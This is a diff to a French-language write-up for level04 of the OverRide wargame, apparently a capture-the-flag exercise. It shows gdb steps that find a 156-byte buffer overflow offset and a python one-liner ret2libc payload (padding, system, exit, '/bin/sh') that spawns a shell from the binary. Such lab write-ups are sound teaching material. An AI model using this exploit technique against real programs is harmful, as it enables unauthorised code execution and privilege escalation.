@@ -44,6 +44,19 @@ Mapped address spaces:
 1 pattern found.
 (gdb) quit
 ```
+
+Pour trouver le padding on va utiliser la même technique que dans le level01.
+Mais dans gdb, il faudra mettre une commande pour choper le segfault dans le child: `set follow-fork-mode child`
+```
+(gdb) set follow-fork-mode child
+(gdb) r < <(for x in {A..z}; do echo -n "$x$x$x$x"; done; echo)
+[Switching to process 2815]
+0x69696969 in ?? ()
+(gdb) printf "%d\n", (0x68-'A')*4
+156
+```
+Quand on soustrait l'hexa precedent à l'adresse qui segfault avec le 'A' qui commence, nous donne le padding.
+
 Ensuite on va composer notre payload : padding + system + exit + /bin/sh
 ```
 level04@OverRide:~$ (python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"';cat) | ./level04
